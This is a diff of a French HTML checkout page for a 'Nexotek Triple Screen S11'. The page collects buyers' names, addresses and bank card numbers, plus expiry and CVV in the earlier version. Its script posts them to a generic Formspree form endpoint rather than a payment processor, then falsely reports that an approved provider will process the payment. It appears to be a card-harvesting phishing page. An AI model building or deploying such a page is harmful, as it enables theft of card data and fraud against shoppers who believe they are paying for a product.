@@ -1,142 +1,147 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <title>Paiement - Nexotek Triple Screen S11</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Paiement - Nexotek</title>
+  <link rel="stylesheet" href="styles.css" />
   <style>
     body {
-      font-family: 'Segoe UI', sans-serif;
-      background-color: #f4f4f4;
+      font-family: Arial, sans-serif;
+      background-color: #111;
+      color: white;
       margin: 0;
       padding: 0;
     }
-
+    header {
+      background-color: #1a1a1a;
+      padding: 15px 20px;
+      display: flex;
+      align-items: center;
+    }
+    header img {
+      height: 40px;
+    }
     .container {
       max-width: 600px;
       margin: 40px auto;
-      background: #fff;
+      background-color: #1e1e1e;
       padding: 30px;
       border-radius: 8px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
     }
-
-    .logo {
+    h1 {
       text-align: center;
-      margin-bottom: 20px;
+      color: #00aaff;
     }
-
-    .logo img {
-      max-height: 60px;
-    }
-
-    .product-image {
-      width: 100%;
-      border-radius: 5px;
-      margin-bottom: 20px;
-    }
-
-    h2 {
-      text-align: center;
-      color: #333;
-    }
-
-    form {
-      display: flex;
-      flex-direction: column;
-    }
-
     label {
+      display: block;
       margin-top: 15px;
-      font-weight: bold;
     }
-
     input, select {
+      width: 100%;
       padding: 10px;
       margin-top: 5px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-    }
-
-    .message {
-      font-size: 0.9em;
-      color: #c00;
-      margin-top: 10px;
-    }
-
-    .total {
-      margin-top: 20px;
-      font-size: 1.2em;
-      font-weight: bold;
-    }
-
-    button {
-      margin-top: 30px;
-      background-color: #1a73e8;
-      color: #fff;
-      padding: 12px;
-      border: none;
       border-radius: 5px;
-      cursor: pointer;
-      font-size: 1em;
+      border: none;
+      background: #333;
+      color: white;
     }
-
-    button:hover {
-      background-color: #0f59c5;
+    input[type="submit"] {
+      background-color: #00aaff;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .product {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .product img {
+      width: 100%;
+      max-width: 300px;
+      margin-bottom: 10px;
+    }
+    .confirmation {
+      display: none;
+      text-align: center;
+      margin-top: 30px;
     }
   </style>
 </head>
 <body>
+  <header>
+    <img src="logo.png" alt="Logo Nexotek" />
+  </header>
+
   <div class="container">
-    <div class="logo">
-      <img src="logo.png" alt="Logo">
+    <div class="product">
+      <img src="product.jpg" alt="Nexotek Triple Screen S11" />
+      <h1>Nexotek Triple Screen S11 – 119€</h1>
     </div>
 
-    <img src="product.jpg" alt="Produit" class="product-image">
+    <form id="paymentForm">
+      <label>Nom complet :</label>
+      <input type="text" name="nom" required />
 
-    <h2>Nexotek Triple Screen S11</h2>
+      <label>Email :</label>
+      <input type="email" name="email" required />
 
-    <form action="https://formspree.io/f/mvgapayj" method="POST">
-      <label>Nom complet</label>
-      <input type="text" name="nom" required>
+      <label>Téléphone :</label>
+      <input type="text" name="telephone" required />
 
-      <label>Email</label>
-      <input type="email" name="email" required>
+      <label>Adresse de livraison :</label>
+      <input type="text" name="adresse" required />
 
-      <label>Téléphone</label>
-      <input type="tel" name="tel" required>
+      <label>Quantité (max 5) :</label>
+      <input type="number" name="quantite" id="quantite" value="1" min="1" max="5" required />
 
-      <label>Numéro de carte</label>
-      <input type="text" name="carte" maxlength="19" required>
+      <label>Total (€) :</label>
+      <input type="text" id="total" value="119" readonly />
 
-      <label>Date d'expiration (MM/AA)</label>
-      <input type="text" name="expiration" placeholder="MM/AA" maxlength="5" required>
+      <label>Numéro de carte bancaire :</label>
+      <input type="text" name="carte" required />
 
-      <label>Cryptogramme (CVV)</label>
-      <input type="text" name="cvv" maxlength="4" required>
-
-      <label>Quantité (max 5)</label>
-      <input type="number" name="quantite" id="quantite" min="1" max="5" value="1" required>
-
-      <p class="message">Commande limitée à 5 exemplaires par achat, afin de garantir un stock disponible pour toutes les entreprises.</p>
-
-      <div class="total" id="total">Total : 119€</div>
-
-      <input type="hidden" name="produit" value="Nexotek Triple Screen S11">
-      <input type="hidden" name="prix_unitaire" value="119">
-
-      <button type="submit">Payer maintenant</button>
+      <input type="submit" value="Valider la commande" />
     </form>
+
+    <div class="confirmation" id="confirmation">
+      <h2>Merci pour votre commande !</h2>
+      <p>Nous avons bien reçu vos informations.</p>
+      <p>Le traitement de votre paiement prendra 10 à 15 minutes via notre prestataire agréé.</p>
+    </div>
   </div>
 
   <script>
+    const form = document.getElementById('paymentForm');
+    const totalField = document.getElementById('total');
     const quantiteInput = document.getElementById('quantite');
-    const totalDisplay = document.getElementById('total');
+    const confirmation = document.getElementById('confirmation');
 
     quantiteInput.addEventListener('input', () => {
-      const prix = 119;
-      const quantite = parseInt(quantiteInput.value) || 1;
-      const total = prix * quantite;
-      totalDisplay.textContent = "Total : " + total + "€";
+      const qte = Math.min(5, parseInt(quantiteInput.value) || 1);
+      quantiteInput.value = qte;
+      totalField.value = qte * 119;
+    });
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const data = new FormData(form);
+
+      fetch("https://formspree.io/f/mvgapayj", {
+        method: "POST",
+        body: data,
+        headers: {
+          Accept: "application/json",
+        },
+      })
+      .then(response => {
+        form.style.display = "none";
+        confirmation.style.display = "block";
+      })
+      .catch(error => {
+        alert("Une erreur est survenue. Merci de réessayer.");
+      });
     });
   </script>
 </body>
